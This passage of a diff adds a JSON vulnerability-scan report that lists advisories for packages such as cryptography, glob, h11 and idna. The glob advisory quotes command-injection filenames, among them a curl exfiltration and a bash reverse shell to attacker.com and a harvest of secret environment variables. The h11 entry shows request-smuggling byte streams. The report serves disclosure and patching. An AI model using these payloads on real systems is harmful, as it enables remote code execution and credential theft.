+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-23931"
+      ],
+      "summary": "Cipher.update_into can corrupt memory if passed an immutable python object as the outbuf",
+      "details": "Previously, `Cipher.update_into` would accept Python objects which implement the buffer protocol, but provide only immutable buffers:\n\n```pycon\n>>> outbuf = b\"\\x00\" * 32\n>>> c = ciphers.Cipher(AES(b\"\\x00\" * 32), modes.ECB()).encryptor()\n>>> c.update_into(b\"\\x00\" * 16, outbuf)\n16\n>>> outbuf\nb'\\xdc\\x95\\xc0x\\xa2@\\x89\\x89\\xadH\\xa2\\x14\\x92\\x84 \\x87\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n```\n\nThis would allow immutable objects (such as `bytes`) to be mutated, thus violating fundamental rules of Python. This is a soundness bug -- it allows programmers to misuse an API, it cannot be exploited by attacker controlled data alone.\n\nThis now correctly raises an exception.\n\nThis issue has been present since `update_into` was originally introduced in cryptography 1.8.",
+      "cwes": [
+        {
+          "id": "CWE-754",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-02-07T20:54:10Z",
+        "modifiedDate": "2025-11-04T17:24:34.140190Z",
+        "daysSincePublished": 1043
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "39.0.1",
+        "recommendation": "Upgrade to 39.0.1 or later",
+        "fixAvailableSince": "2025-11-04T17:24:34.140Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-w7pp-m8wf-vj6r"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-23931"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/pull/8230"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/d6951dca25de45abd52da51b608055371fbcde4e"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2023-11.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/10/msg00012.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20230324-0007"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-x4qr-2fvf-3mr5",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-0286",
+        "RUSTSEC-2023-0006"
+      ],
+      "summary": "Vulnerable OpenSSL included in cryptography wheels",
+      "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8.1-39.0.0  are vulnerable to a security issue. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20221213.txt and https://www.openssl.org/news/secadv/20230207.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+      "cwes": [
+        {
+          "id": "CWE-843",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-02-08T22:17:06Z",
+        "modifiedDate": "2025-11-04T22:28:41.131649Z",
+        "daysSincePublished": 1042
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "39.0.1",
+        "recommendation": "Upgrade to 39.0.1 or later",
+        "fixAvailableSince": "2025-11-04T22:28:41.131Z",
+        "daysSinceFix": 42,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-x4qr-2fvf-3mr5"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0286"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/security/cve/cve-2023-0286"
+        },
+        {
+          "type": "WEB",
+          "url": "https://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-3.6.2-relnotes.txt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/018_x509.patch.sig"
+        },
+        {
+          "type": "WEB",
+          "url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2c6c9d439b484e1ba9830d8454a34fa4f80fdfe9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2f7530077e0ef79d98718138716bc51ca0cad658"
+        },
+        {
+          "type": "WEB",
+          "url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=fd2af07dc083a350c959147097003a14a5e8ac4d"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        },
+        {
+          "type": "WEB",
+          "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2023-0003"
+        },
+        {
+          "type": "WEB",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2023-0006.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.gentoo.org/glsa/202402-08"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.openssl.org/news/secadv/20230207.txt"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-5j98-mcp5-4vw2",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-64756"
+      ],
+      "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "cwes": [
+        {
+          "id": "CWE-78",
+          "name": "OS Command Injection"
+        }
+      ],
+      "age": {
+        "age": "Very Recent (< 1 month)",
+        "isRecent": true,
+        "publishedDate": "2025-11-17T17:38:56Z",
+        "modifiedDate": "2025-11-19T02:30:52Z",
+        "daysSincePublished": 30
+      },
+      "affected": {
+        "package": "glob",
+        "version": "10.4.5",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "10.4.5",
+        "fixedIn": "11.1.0",
+        "recommendation": "Upgrade to 11.1.0 or later",
+        "fixAvailableSince": "2025-11-19T02:30:52.000Z",
+        "daysSinceFix": 28,
+        "monthsSinceFix": 0,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64756"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/isaacs/node-glob"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-pfrx-2q88-qq97",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-33987"
+      ],
+      "summary": "Got allows a redirect to a UNIX socket",
+      "details": "The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.",
+      "cwes": [],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-06-19T00:00:21Z",
+        "modifiedDate": "2023-11-08T04:09:41.125694Z",
+        "daysSincePublished": 1277
+      },
+      "affected": {
+        "package": "got",
+        "version": "8.3.2",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "8.3.2",
+        "fixedIn": "12.1.0",
+        "recommendation": "Upgrade to 12.1.0 or later",
+        "fixAvailableSince": "2023-11-08T04:09:41.125Z",
+        "daysSinceFix": 770,
+        "monthsSinceFix": 25,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-33987"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sindresorhus/got/pull/2047"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sindresorhus/got/commit/861ccd9ac2237df762a9e2beed7edd88c60782dc"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/sindresorhus/got"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sindresorhus/got/releases/tag/v11.8.5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sindresorhus/got/releases/tag/v12.1.0"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-vqfr-h8mv-ghfj",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-43859"
+      ],
+      "summary": "h11 accepts some malformed Chunked-Encoding bodies",
+      "details": "### Impact\n\nA leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.\n\n### Details\n\nHTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of \"chunks\", each of which consists of:\n\n- chunk length\n- `\\r\\n`\n- `length` bytes of content\n- `\\r\\n`\n\nIn versions of h11 up to 0.14.0, h11 instead parsed them as:\n\n- chunk length\n- `\\r\\n`\n- `length` bytes of content\n- any two bytes\n\ni.e. it did not validate that the trailing `\\r\\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.\n\nBy itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:\n\n- chunk length\n- `\\r\\n`\n- `length` bytes of content\n- more bytes of content, as many as it takes until you find a `\\r\\n`\n\nFor example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic \"read until end of line\" helper to consumes the trailing `\\r\\n`.\n\nIn this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\\r\\n`):\n\n```\nGET /one HTTP/1.1\nHost: localhost\nTransfer-Encoding: chunked\n\n5\nAAAAAXX2\n45\n0\n\nGET /two HTTP/1.1\nHost: localhost\nTransfer-Encoding: chunked\n\n0\n```\n\nHere h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\\r\\n\\r\\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a \"request smuggling\" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.\n\nEven worse, if our buggy reverse proxy receives two requests from different users:\n\n```\nGET /one HTTP/1.1\nHost: localhost\nTransfer-Encoding: chunked\n\n5\nAAAAAXX999\n0\n```\n\n```\nGET /two HTTP/1.1\nHost: localhost\nCookie: SESSION_KEY=abcdef...\n```\n\n...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.\n\n### Patches\n\nFixed in h11 0.15.0.\n\n### Workarounds\n\nSince exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.\n\n### Credits\n\nReported by Jeppe Bonde Weikop on 2025-01-09.",
+      "cwes": [
+        {
+          "id": "CWE-444",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-04-24T16:07:56Z",
+        "modifiedDate": "2025-04-24T22:22:25.803917Z",
+        "daysSincePublished": 237
+      },
+      "affected": {
+        "package": "h11",
+        "version": "0.12.0",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "0.12.0",
+        "fixedIn": "0.16.0",
+        "recommendation": "Upgrade to 0.16.0 or later",
+        "fixAvailableSince": "2025-04-24T22:22:25.803Z",
+        "daysSinceFix": 236,
+        "monthsSinceFix": 7,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/python-hyper/h11/security/advisories/GHSA-vqfr-h8mv-ghfj"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-43859"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/python-hyper/h11/commit/114803a29ce50116dc47951c690ad4892b1a36ed"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/python-hyper/h11"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-rc47-6667-2j5j",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-25881"
+      ],
+      "summary": "http-cache-semantics vulnerable to Regular Expression Denial of Service",
+      "details": "http-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-01-31T06:30:26Z",
+        "modifiedDate": "2025-02-13T19:01:49.374369Z",
+        "daysSincePublished": 1051
+      },
+      "affected": {
+        "package": "http-cache-semantics",
+        "version": "3.8.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.8.1",
+        "fixedIn": "4.1.1",
+        "recommendation": "Upgrade to 4.1.1 or later",
+        "fixAvailableSince": "2025-02-13T19:01:49.374Z",
+        "daysSinceFix": 307,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25881"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/kornelski/http-cache-semantics/commit/560b2d8ef452bbba20ffed69dc155d63ac757b74"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/kornelski/http-cache-semantics"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/kornelski/http-cache-semantics/blob/master/index.js%23L83"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20230622-0008"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3253332"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-HTTPCACHESEMANTICS-3248783"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2024-60",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-3651",
+        "GHSA-jjg7-2v4v-x38h"
+      ],
+      "summary": "No summary available",
+      "details": "A vulnerability was identified in the kjd/idna library, specifically within the `idna.encode()` function, affecting version 3.6. The issue arises from the function's handling of crafted input strings, which can lead to quadratic complexity and consequently, a denial of service condition. This vulnerability is triggered by a crafted input that causes the `idna.encode()` function to process the input with considerable computational load, significantly increasing the processing time in a quadratic manner relative to the input size.",
+      "cwes": [],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-07-07T18:15:00Z",
+        "modifiedDate": "2024-07-11T17:42:33.704488Z",
+        "daysSincePublished": 528
+      },
+      "affected": {
+        "package": "idna",
+        "version": "3.3",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.3",
+        "fixedIn": "1d365e17e10d72d0b7876316fc7b9ca0eebdd38d",
+        "recommendation": "Upgrade to 1d365e17e10d72d0b7876316fc7b9ca0eebdd38d or later",
+        "fixAvailableSince": "2024-07-11T17:42:33.704Z",
+        "daysSinceFix": 524,
+        "monthsSinceFix": 17,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "FIX",
+          "url": "https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/kjd/idna/commit/1d365e17e10d72d0b7876316fc7b9ca0eebdd38d"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-jjg7-2v4v-x38h",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-3651",
+        "PYSEC-2024-60"
+      ],
+      "summary": "Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode",
+      "details": "### Impact\nA specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.\n\n### Patches\nThe function has been refined to reject such strings without the associated resource consumption in version 3.7.\n\n### Workarounds\nDomain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.\n\n### References\n* https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        },
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-04-11T21:32:40Z",
+        "modifiedDate": "2025-11-05T20:30:45.121847Z",
+        "daysSincePublished": 614
+      },
+      "affected": {
+        "package": "idna",
+        "version": "3.3",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.3",
+        "fixedIn": "3.7",
+        "recommendation": "Upgrade to 3.7 or later",
+        "fixAvailableSince": "2025-11-05T20:30:45.121Z",
+        "daysSinceFix": 41,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/kjd/idna/security/advisories/GHSA-jjg7-2v4v-x38h"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-3651"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/kjd/idna/commit/1d365e17e10d72d0b7876316fc7b9ca0eebdd38d"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/kjd/idna"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/idna/PYSEC-2024-60.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/05/msg00006.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4YQUPYH3SVZ5GFF2CDQ55FCM575AZTF2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/F2S5E23N6E52S46KGNYTDFB75LOC4N4D"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/S5IDLLD2IKSIVRBSLB34WTSYGLMWUFWF"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ULSC7HBJKXB3BZV367WM5BR6DFEC4Z43"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-qwmp-2cf2-g9g6",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-40898",
+        "PYSEC-2022-43017"
+      ],
+      "summary": "pypa/wheel vulnerable to Regular Expression denial of service (ReDoS)",
+      "details": "Python Packaging Authority (PyPA) Wheel is a reference implementation of the Python wheel packaging standard. Wheel 0.37.1 and earlier are vulnerable to a Regular Expression denial of service via attacker controlled input to the wheel cli. The vulnerable regex is used to verify the validity of Wheel file names. This has been patched in version 0.38.1.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-12-23T00:30:23Z",
+        "modifiedDate": "2024-11-19T19:22:35.244591Z",
+        "daysSincePublished": 1090
+      },
+      "affected": {
+        "package": "wheel",
+        "version": "0.37.1",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "0.37.1",
+        "fixedIn": "0.38.1",
+        "recommendation": "Upgrade to 0.38.1 or later",
+        "fixAvailableSince": "2024-11-19T19:22:35.244Z",
+        "daysSinceFix": 393,
+        "monthsSinceFix": 13,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40898"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/wheel/PYSEC-2022-43017.yaml"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pypa/wheel"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/wheel/blob/main/src/wheel/wheelfile.py#L18"
+        },
+        {
+          "type": "WEB",
+          "url": "https://pypi.org/project/wheel"
+        },
+        {
+          "type": "WEB",
+          "url": "https://pyup.io/posts/pyup-discovers-redos-vulnerabilities-in-top-python-packages"
+        },
+        {
+          "type": "WEB",
+          "url": "https://pyup.io/vulnerabilities/CVE-2022-40898/51499"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-248v-346w-9cwc",
+      "severity": "LOW",
+      "severityScore": 2.5,
+      "cvssScores": [],
+      "aliases": [
+        "CVE-2024-39689",
+        "PYSEC-2024-230"
+      ],
+      "summary": "Certifi removes GLOBALTRUST root certificate",
+      "details": "Certifi 2024.07.04 removes root certificates from \"GLOBALTRUST\" from the root store. These are in the process of being removed from Mozilla's trust store.\n\nGLOBALTRUST's root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues\". Conclusions of Mozilla's investigation can be found [here]( https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI).",
+      "cwes": [
+        {
+          "id": "CWE-345",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-07-05T20:06:40Z",
+        "modifiedDate": "2025-02-13T00:55:06.046060Z",
+        "daysSincePublished": 530
+      },
+      "affected": {
+        "package": "certifi",
+        "version": "2022.5.18.1",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2022.5.18.1",
+        "fixedIn": "2024.7.4",
